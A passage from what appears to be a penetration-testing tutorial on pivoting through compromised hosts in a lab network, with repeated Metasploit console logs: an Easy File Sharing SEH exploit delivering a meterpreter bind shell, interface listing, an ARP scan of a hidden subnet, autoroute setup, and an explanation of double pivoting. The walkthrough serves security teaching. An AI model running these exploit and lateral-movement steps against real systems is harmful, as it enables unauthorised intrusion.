class="enlighter-m0">opened</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-n0">172.16</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text">.</span><span class="enlighter-m3">20</span><span class="enlighter-text">-</span><span class="enlighter-n0">172.16</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text">.</span><span class="enlighter-m3">11</span><span class="enlighter-text">:</span><span class="enlighter-n1">0</span><span class="enlighter-text"> -</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> </span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text">:</span><span class="enlighter-n1">4444</span><span class="enlighter-g1">)</span><span class="enlighter-text"> at </span><span class="enlighter-n1">2016</span><span class="enlighter-text">-</span><span class="enlighter-n1">12</span><span class="enlighter-text">-</span><span class="enlighter-n1">26</span><span class="enlighter-text"> </span><span class="enlighter-n1">14</span><span class="enlighter-text">:</span><span class="enlighter-n1">21</span><span class="enlighter-text">:</span><span class="enlighter-n1">11</span><span class="enlighter-text"> +</span><span class="enlighter-n4">0300</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">meterpreter </span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> ipconfig</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">Interface  </span><span class="enlighter-n1">1</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">============</span></div></div><div class=""><div><span class="enlighter-text">Name         </span><span class="enlighter-g0">:</span><span class="enlighter-text"> MS TCP Loopback interface</span></div></div><div class=""><div><span class="enlighter-text">Hardware MAC </span><span class="enlighter-g0">:</span><span class="enlighter-text"> </span><span class="enlighter-n4">00</span><span class="enlighter-text">:</span><span class="enlighter-n4">00</span><span class="enlighter-text">:</span><span class="enlighter-n4">00</span><span class="enlighter-text">:</span><span class="enlighter-n4">00</span><span class="enlighter-text">:</span><span class="enlighter-n4">00</span><span class="enlighter-text">:</span><span class="enlighter-n4">00</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">MTU          </span><span class="enlighter-g0">:</span><span class="enlighter-text"> </span><span class="enlighter-n1">1520</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">IPv4 Address </span><span class="enlighter-g0">:</span><span class="enlighter-text"> </span><span class="enlighter-n0">127.0</span><span class="enlighter-text">.</span><span class="enlighter-n0">0.1</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">Interface </span><span class="enlighter-n1">65539</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">============</span></div></div><div class=""><div><span class="enlighter-text">Name         </span><span class="enlighter-g0">:</span><span class="enlighter-text"> </span><span class="enlighter-m0">Intel</span><span class="enlighter-g1">(</span><span class="enlighter-text">R</span><span class="enlighter-g1">)</span><span class="enlighter-text"> PRO/</span><span class="enlighter-n1">1000</span><span class="enlighter-text"> MT Desktop Adapter</span></div></div><div class=""><div><span class="enlighter-text">Hardware MAC </span><span class="enlighter-g0">:</span><span class="enlighter-text"> </span><span class="enlighter-n1">08</span><span class="enlighter-text">:</span><span class="enlighter-n4">00</span><span class="enlighter-text">:</span><span class="enlighter-n1">27</span><span class="enlighter-text">:</span><span class="enlighter-n1">29</span><span class="enlighter-text">:cd:cb</span></div></div><div class=""><div><span class="enlighter-text">MTU          </span><span class="enlighter-g0">:</span><span class="enlighter-text"> </span><span class="enlighter-n1">1500</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">IPv4 Address </span><span class="enlighter-g0">:</span><span class="enlighter-text"> </span><span class="enlighter-m3">8</span><span class="enlighter-text">.</span><span class="enlighter-m3">8</span><span class="enlighter-text">.</span><span class="enlighter-n0">8.3</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">IPv4 Netmask </span><span class="enlighter-g0">:</span><span class="enlighter-text"> </span><span class="enlighter-n0">255.255</span><span class="enlighter-text">.</span><span class="enlighter-m3">255</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">Interface </span><span class="enlighter-n1">65540</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">============</span></div></div><div class=""><div><span class="enlighter-text">Name         </span><span class="enlighter-g0">:</span><span class="enlighter-text"> </span><span class="enlighter-m0">Intel</span><span class="enlighter-g1">(</span><span class="enlighter-text">R</span><span class="enlighter-g1">)</span><span class="enlighter-text"> PRO/</span><span class="enlighter-n1">1000</span><span class="enlighter-text"> MT Desktop Adapter </span><span class="enlighter-c0">#2</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">Hardware MAC </span><span class="enlighter-g0">:</span><span class="enlighter-text"> </span><span class="enlighter-n1">08</span><span class="enlighter-text">:</span><span class="enlighter-n4">00</span><span class="enlighter-text">:</span><span class="enlighter-n1">27</span><span class="enlighter-text">:e3:</span><span class="enlighter-n1">47</span><span class="enlighter-text">:</span><span class="enlighter-n1">43</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">MTU          </span><span class="enlighter-g0">:</span><span class="enlighter-text"> </span><span class="enlighter-n1">1500</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">IPv4 Address </span><span class="enlighter-g0">:</span><span class="enlighter-text"> </span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">IPv4 Netmask </span><span class="enlighter-g0">:</span><span class="enlighter-text"> </span><span class="enlighter-n0">255.255</span><span class="enlighter-text">.</span><span class="enlighter-m3">255</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">meterpreter </span><span class="enlighter-g1">&gt;</span></div></div></div><div class="enlighter-raw">msf  &gt; use exploit/windows/http/easyfilesharing_seh 

msf exploit(easyfilesharing_seh) &gt; show options 

Module options (exploit/windows/http/easyfilesharing_seh):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   RHOST                   yes       The target address
   RPORT  80               yes       The target port


Exploit target:

   Id  Name
   --  ----
   0   Easy File Sharing 7.2 HTTP



msf exploit(easyfilesharing_seh) &gt; set rhost 7.7.7.20
rhost =&gt; 7.7.7.20

msf exploit(easyfilesharing_seh) &gt; set payload windows/meterpreter/bind_tcp
payload =&gt; windows/meterpreter/bind_tcp

msf exploit(easyfilesharing_seh) &gt; run

[*] Started bind handler
[*] 7.7.7.20:80 - 7.7.7.20:80 - Sending exploit...
[+] 7.7.7.20:80 - Exploit Sent
[*] Sending stage (957999 bytes) to 7.7.7.20
[*] Meterpreter session 2 opened (172.16.0.20-172.16.0.11:0 -&gt; 7.7.7.20:4444) at 2016-12-26 14:21:11 +0300


meterpreter &gt; ipconfig

Interface  1
============
Name         : MS TCP Loopback interface
Hardware MAC : 00:00:00:00:00:00
MTU          : 1520
IPv4 Address : 127.0.0.1


Interface 65539
============
Name         : Intel(R) PRO/1000 MT Desktop Adapter
Hardware MAC : 08:00:27:29:cd:cb
MTU          : 1500
IPv4 Address : 8.8.8.3
IPv4 Netmask : 255.255.255.0


Interface 65540
============
Name         : Intel(R) PRO/1000 MT Desktop Adapter #2
Hardware MAC : 08:00:27:e3:47:43
MTU          : 1500
IPv4 Address : 7.7.7.20
IPv4 Netmask : 255.255.255.0


meterpreter &gt;</div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="null">msf  &gt; use exploit/windows/http/easyfilesharing_seh 

msf exploit(easyfilesharing_seh) &gt; show options 

Module options (exploit/windows/http/easyfilesharing_seh):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   RHOST                   yes       The target address
   RPORT  80               yes       The target port


Exploit target:

   Id  Name
   --  ----
   0   Easy File Sharing 7.2 HTTP



msf exploit(easyfilesharing_seh) &gt; set rhost 7.7.7.20
rhost =&gt; 7.7.7.20

msf exploit(easyfilesharing_seh) &gt; set payload windows/meterpreter/bind_tcp
payload =&gt; windows/meterpreter/bind_tcp

msf exploit(easyfilesharing_seh) &gt; run

[*] Started bind handler
[*] 7.7.7.20:80 - 7.7.7.20:80 - Sending exploit...
[+] 7.7.7.20:80 - Exploit Sent
[*] Sending stage (957999 bytes) to 7.7.7.20
[*] Meterpreter session 2 opened (172.16.0.20-172.16.0.11:0 -&gt; 7.7.7.20:4444) at 2016-12-26 14:21:11 +0300


meterpreter &gt; ipconfig

Interface  1
============
Name         : MS TCP Loopback interface
Hardware MAC : 00:00:00:00:00:00
MTU          : 1520
IPv4 Address : 127.0.0.1


Interface 65539
============
Name         : Intel(R) PRO/1000 MT Desktop Adapter
Hardware MAC : 08:00:27:29:cd:cb
MTU          : 1500
IPv4 Address : 8.8.8.3
IPv4 Netmask : 255.255.255.0


Interface 65540
============
Name         : Intel(R) PRO/1000 MT Desktop Adapter #2
Hardware MAC : 08:00:27:e3:47:43
MTU          : 1500
IPv4 Address : 7.7.7.20
IPv4 Netmask : 255.255.255.0


meterpreter &gt;</pre>
<p>In the last case, the point where the attacker comes is as below:</p>
<p><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-574" src="https://pentest.blog/wp-content/uploads/ms08_efsbof_exploit2.png" alt="" width="701" height="260" srcset="https://pentest.blog/wp-content/uploads/ms08_efsbof_exploit2.png 701w, https://pentest.blog/wp-content/uploads/ms08_efsbof_exploit2-300x111.png 300w" sizes="(max-width: 701px) 100vw, 701px"></p>
<p>Since we’ve got an access to the 7.7.7.20 machine. We need to perform information gathering again. JC named machine have two NIC like RD machine.&nbsp;That means we’ve found our second hidden network (<strong>8.8.8.0/24).</strong></p>
<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-generic enlighter-hover "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-text">meterpreter </span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> ipconfig</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">Interface  </span><span class="enlighter-n1">1</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">============</span></div></div><div class=""><div><span class="enlighter-text">Name         </span><span class="enlighter-g0">:</span><span class="enlighter-text"> MS TCP Loopback interface</span></div></div><div class=""><div><span class="enlighter-text">Hardware MAC </span><span class="enlighter-g0">:</span><span class="enlighter-text"> </span><span class="enlighter-n4">00</span><span class="enlighter-text">:</span><span class="enlighter-n4">00</span><span class="enlighter-text">:</span><span class="enlighter-n4">00</span><span class="enlighter-text">:</span><span class="enlighter-n4">00</span><span class="enlighter-text">:</span><span class="enlighter-n4">00</span><span class="enlighter-text">:</span><span class="enlighter-n4">00</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">MTU          </span><span class="enlighter-g0">:</span><span class="enlighter-text"> </span><span class="enlighter-n1">1520</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">IPv4 Address </span><span class="enlighter-g0">:</span><span class="enlighter-text"> </span><span class="enlighter-n0">127.0</span><span class="enlighter-text">.</span><span class="enlighter-n0">0.1</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">Interface </span><span class="enlighter-n1">65539</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">============</span></div></div><div class=""><div><span class="enlighter-text">Name         </span><span class="enlighter-g0">:</span><span class="enlighter-text"> </span><span class="enlighter-m0">Intel</span><span class="enlighter-g1">(</span><span class="enlighter-text">R</span><span class="enlighter-g1">)</span><span class="enlighter-text"> PRO/</span><span class="enlighter-n1">1000</span><span class="enlighter-text"> MT Desktop Adapter</span></div></div><div class=""><div><span class="enlighter-text">Hardware MAC </span><span class="enlighter-g0">:</span><span class="enlighter-text"> </span><span class="enlighter-n1">08</span><span class="enlighter-text">:</span><span class="enlighter-n4">00</span><span class="enlighter-text">:</span><span class="enlighter-n1">27</span><span class="enlighter-text">:</span><span class="enlighter-n1">29</span><span class="enlighter-text">:cd:cb</span></div></div><div class=""><div><span class="enlighter-text">MTU          </span><span class="enlighter-g0">:</span><span class="enlighter-text"> </span><span class="enlighter-n1">1500</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">IPv4 Address </span><span class="enlighter-g0">:</span><span class="enlighter-text"> </span><span class="enlighter-m3">8</span><span class="enlighter-text">.</span><span class="enlighter-m3">8</span><span class="enlighter-text">.</span><span class="enlighter-n0">8.3</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">IPv4 Netmask </span><span class="enlighter-g0">:</span><span class="enlighter-text"> </span><span class="enlighter-n0">255.255</span><span class="enlighter-text">.</span><span class="enlighter-m3">255</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">Interface </span><span class="enlighter-n1">65540</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">============</span></div></div><div class=""><div><span class="enlighter-text">Name         </span><span class="enlighter-g0">:</span><span class="enlighter-text"> </span><span class="enlighter-m0">Intel</span><span class="enlighter-g1">(</span><span class="enlighter-text">R</span><span class="enlighter-g1">)</span><span class="enlighter-text"> PRO/</span><span class="enlighter-n1">1000</span><span class="enlighter-text"> MT Desktop Adapter </span><span class="enlighter-c0">#2</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">Hardware MAC </span><span class="enlighter-g0">:</span><span class="enlighter-text"> </span><span class="enlighter-n1">08</span><span class="enlighter-text">:</span><span class="enlighter-n4">00</span><span class="enlighter-text">:</span><span class="enlighter-n1">27</span><span class="enlighter-text">:e3:</span><span class="enlighter-n1">47</span><span class="enlighter-text">:</span><span class="enlighter-n1">43</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">MTU          </span><span class="enlighter-g0">:</span><span class="enlighter-text"> </span><span class="enlighter-n1">1500</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">IPv4 Address </span><span class="enlighter-g0">:</span><span class="enlighter-text"> </span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">IPv4 Netmask </span><span class="enlighter-g0">:</span><span class="enlighter-text"> </span><span class="enlighter-n0">255.255</span><span class="enlighter-text">.</span><span class="enlighter-m3">255</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span></div></div></div><div class="enlighter-raw">meterpreter &gt; ipconfig

Interface  1
============
Name         : MS TCP Loopback interface
Hardware MAC : 00:00:00:00:00:00
MTU          : 1520
IPv4 Address : 127.0.0.1


Interface 65539
============
Name         : Intel(R) PRO/1000 MT Desktop Adapter
Hardware MAC : 08:00:27:29:cd:cb
MTU          : 1500
IPv4 Address : 8.8.8.3
IPv4 Netmask : 255.255.255.0


Interface 65540
============
Name         : Intel(R) PRO/1000 MT Desktop Adapter #2
Hardware MAC : 08:00:27:e3:47:43
MTU          : 1500
IPv4 Address : 7.7.7.20
IPv4 Netmask : 255.255.255.0</div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-linenumbers="false">meterpreter &gt; ipconfig

Interface  1
============
Name         : MS TCP Loopback interface
Hardware MAC : 00:00:00:00:00:00
MTU          : 1520
IPv4 Address : 127.0.0.1


Interface 65539
============
Name         : Intel(R) PRO/1000 MT Desktop Adapter
Hardware MAC : 08:00:27:29:cd:cb
MTU          : 1500
IPv4 Address : 8.8.8.3
IPv4 Netmask : 255.255.255.0


Interface 65540
============
Name         : Intel(R) PRO/1000 MT Desktop Adapter #2
Hardware MAC : 08:00:27:e3:47:43
MTU          : 1500
IPv4 Address : 7.7.7.20
IPv4 Netmask : 255.255.255.0
</pre>
<p>Let’s continue information gathering by performing arp scanner on second&nbsp;hidden network.</p>
<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-generic enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-text">meterpreter </span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> run post/windows/gather/arp_scanner RHOSTS=</span><span class="enlighter-m3">8</span><span class="enlighter-text">.</span><span class="enlighter-m3">8</span><span class="enlighter-text">.</span><span class="enlighter-n0">8.0</span><span class="enlighter-text">/</span><span class="enlighter-n1">24</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">*</span><span class="enlighter-g1">]</span><span class="enlighter-text"> Running module against SRV03</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">*</span><span class="enlighter-g1">]</span><span class="enlighter-text"> ARP Scanning </span><span class="enlighter-m3">8</span><span class="enlighter-text">.</span><span class="enlighter-m3">8</span><span class="enlighter-text">.</span><span class="enlighter-n0">8.0</span><span class="enlighter-text">/</span><span class="enlighter-n1">24</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">*</span><span class="enlighter-g1">]</span><span class="enlighter-text">   IP: </span><span class="enlighter-m3">8</span><span class="enlighter-text">.</span><span class="enlighter-m3">8</span><span class="enlighter-text">.</span><span class="enlighter-n0">8.3</span><span class="enlighter-text"> MAC </span><span class="enlighter-n1">08</span><span class="enlighter-text">:</span><span class="enlighter-n4">00</span><span class="enlighter-text">:</span><span class="enlighter-n1">27</span><span class="enlighter-text">:</span><span class="enlighter-n1">29</span><span class="enlighter-text">:cd:</span><span class="enlighter-m0">cb</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">CADMUS COMPUTER SYSTEMS</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">*</span><span class="enlighter-g1">]</span><span class="enlighter-text">   IP: </span><span class="enlighter-m3">8</span><span class="enlighter-text">.</span><span class="enlighter-m3">8</span><span class="enlighter-text">.</span><span class="enlighter-n0">8.1</span><span class="enlighter-text"> MAC 0a:</span><span class="enlighter-n4">00</span><span class="enlighter-text">:</span><span class="enlighter-n1">27</span><span class="enlighter-text">:</span><span class="enlighter-n4">00</span><span class="enlighter-text">:</span><span class="enlighter-n4">00</span><span class="enlighter-text">:</span><span class="enlighter-m0">03</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">UNKNOWN</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">*</span><span class="enlighter-g1">]</span><span class="enlighter-text">   IP: </span><span class="enlighter-m3">8</span><span class="enlighter-text">.</span><span class="enlighter-m3">8</span><span class="enlighter-text">.</span><span class="enlighter-n0">8.9</span><span class="enlighter-text"> MAC </span><span class="enlighter-n1">08</span><span class="enlighter-text">:</span><span class="enlighter-n4">00</span><span class="enlighter-text">:</span><span class="enlighter-n1">27</span><span class="enlighter-text">:</span><span class="enlighter-n1">56</span><span class="enlighter-text">:f1:</span><span class="enlighter-m0">7c</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">CADMUS COMPUTER SYSTEMS</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">*</span><span class="enlighter-g1">]</span><span class="enlighter-text">    IP: </span><span class="enlighter-m3">8</span><span class="enlighter-text">.</span><span class="enlighter-m3">8</span><span class="enlighter-text">.</span><span class="enlighter-n0">8.13</span><span class="enlighter-text"> MAC </span><span class="enlighter-n1">08</span><span class="enlighter-text">:</span><span class="enlighter-n4">00</span><span class="enlighter-text">:</span><span class="enlighter-n1">27</span><span class="enlighter-text">:</span><span class="enlighter-n1">13</span><span class="enlighter-text">:a3:</span><span class="enlighter-m0">b1</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">CADMUS COMPUTER SYSTEMS</span><span class="enlighter-g1">)</span></div></div></div><div class="enlighter-raw">meterpreter &gt; run post/windows/gather/arp_scanner RHOSTS=8.8.8.0/24

[*] Running module against SRV03
[*] ARP Scanning 8.8.8.0/24
[*]   IP: 8.8.8.3 MAC 08:00:27:29:cd:cb (CADMUS COMPUTER SYSTEMS)
[*]   IP: 8.8.8.1 MAC 0a:00:27:00:00:03 (UNKNOWN)
[*]   IP: 8.8.8.9 MAC 08:00:27:56:f1:7c (CADMUS COMPUTER SYSTEMS)
[*]    IP: 8.8.8.13 MAC 08:00:27:13:a3:b1 (CADMUS COMPUTER SYSTEMS)</div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="null">meterpreter &gt; run post/windows/gather/arp_scanner RHOSTS=8.8.8.0/24

[*] Running module against SRV03
[*] ARP Scanning 8.8.8.0/24
[*] 	IP: 8.8.8.3 MAC 08:00:27:29:cd:cb (CADMUS COMPUTER SYSTEMS)
[*] 	IP: 8.8.8.1 MAC 0a:00:27:00:00:03 (UNKNOWN)
[*] 	IP: 8.8.8.9 MAC 08:00:27:56:f1:7c (CADMUS COMPUTER SYSTEMS)
[*]&nbsp;   IP:&nbsp;8.8.8.13&nbsp;MAC&nbsp;08:00:27:13:a3:b1&nbsp;(CADMUS&nbsp;COMPUTER&nbsp;SYSTEMS)
</pre>
<p>ARP scan says 4 machine found in this network.</p>
<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-generic enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-text">meterpreter </span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> run autoroute -s </span><span class="enlighter-m3">8</span><span class="enlighter-text">.</span><span class="enlighter-m3">8</span><span class="enlighter-text">.</span><span class="enlighter-n0">8.0</span><span class="enlighter-text">/</span><span class="enlighter-n1">24</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">*</span><span class="enlighter-g1">]</span><span class="enlighter-text"> Adding a route to </span><span class="enlighter-m3">8</span><span class="enlighter-text">.</span><span class="enlighter-m3">8</span><span class="enlighter-text">.</span><span class="enlighter-n0">8.0</span><span class="enlighter-text">/</span><span class="enlighter-n0">255.255</span><span class="enlighter-text">.</span><span class="enlighter-m3">255</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text">...</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">+</span><span class="enlighter-g1">]</span><span class="enlighter-text"> Added route to </span><span class="enlighter-m3">8</span><span class="enlighter-text">.</span><span class="enlighter-m3">8</span><span class="enlighter-text">.</span><span class="enlighter-n0">8.0</span><span class="enlighter-text">/</span><span class="enlighter-n0">255.255</span><span class="enlighter-text">.</span><span class="enlighter-m3">255</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text"> via </span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">*</span><span class="enlighter-g1">]</span><span class="enlighter-text"> Use the -p option to list all active routes</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">msf </span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> route print</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">Active Routing Table</span></div></div><div class=""><div><span class="enlighter-text">====================</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"> Subnet Netmask Gateway</span></div></div><div class=""><div><span class="enlighter-text"> ------ ------- -------</span></div></div><div class=""><div><span class="enlighter-text"> </span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.0</span><span class="enlighter-text"> </span><span class="enlighter-n0">255.255</span><span class="enlighter-text">.</span><span class="enlighter-m3">255</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text"> Session </span><span class="enlighter-n1">1</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"> </span><span class="enlighter-m3">8</span><span class="enlighter-text">.</span><span class="enlighter-m3">8</span><span class="enlighter-text">.</span><span class="enlighter-n0">8.0</span><span class="enlighter-text"> </span><span class="enlighter-n0">255.255</span><span class="enlighter-text">.</span><span class="enlighter-m3">255</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text"> Session </span><span class="enlighter-n1">3</span></div></div></div><div class="enlighter-raw">meterpreter &gt; run autoroute -s 8.8.8.0/24

[*] Adding a route to 8.8.8.0/255.255.255.0...
[+] Added route to 8.8.8.0/255.255.255.0 via 7.7.7.20
[*] Use the -p option to list all active routes

msf &gt; route print

Active Routing Table
====================

 Subnet Netmask Gateway
 ------ ------- -------
 7.7.7.0 255.255.255.0 Session 1
 8.8.8.0 255.255.255.0 Session 3</div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="null">meterpreter &gt; run autoroute -s 8.8.8.0/24

[*] Adding a route to 8.8.8.0/255.255.255.0...
[+] Added route to 8.8.8.0/255.255.255.0 via 7.7.7.20
[*] Use the -p option to list all active routes

msf &gt; route print

Active Routing Table
====================

 Subnet Netmask Gateway
 ------ ------- -------
 7.7.7.0 255.255.255.0 Session 1
 8.8.8.0 255.255.255.0 Session 3</pre>
<p>And we are adding routing definition&nbsp;again. We will talk about that in next chapter.</p>
<h3>Double Pivoting</h3>
<p><strong>8.8.8.0/24</strong> network was discovered in the information gathering&nbsp;process for the JC system. We already have&nbsp;a routing rule between <strong>172.16.0.0/24</strong> and <strong>7.7.7.0/24</strong> networks via the first compromised machine.</p>
<p>In the present case, network packages that comes from &nbsp;<strong>172.16.0.20</strong>&nbsp; to access the JC device <em>(second compromised machine)</em>&nbsp;first go to the RD device <em>(first compromised machine)</em>, and the RD transmits those packages&nbsp;to the JC machine.</p>
<p>If the attacker who is&nbsp;<strong>172.16.0.20</strong> wishes to access <strong>8.8.8.0/24</strong> -newly discovered&nbsp;<em>second hidden network</em>– network, a new routing rule must be defined. In the tools we will use outside the Metasploit Framework, we must run a new socks4 proxy server to connect these two pivots and define the new proxy server in the configuration file of the proxychains tool.</p>
<p>Network packages attempting to reach the 8.8.8.9 destination from the attacker machine&nbsp;(172.16.0.20) will pass through two different points:</p>
<ul>
<li><strong>RD:</strong> I do not know how to access the 8.8.8.9 IP address. But I know the system who knows how to access it. I can direct you to it.</li>
<li><strong>JC:</strong> I know how to forward packets from the 7.7.7.0/24 network to the 8.8.8.0/24 network.</li>
</ul>
<p>The final state of the compromised&nbsp;and discovered systems is as follows.</p>
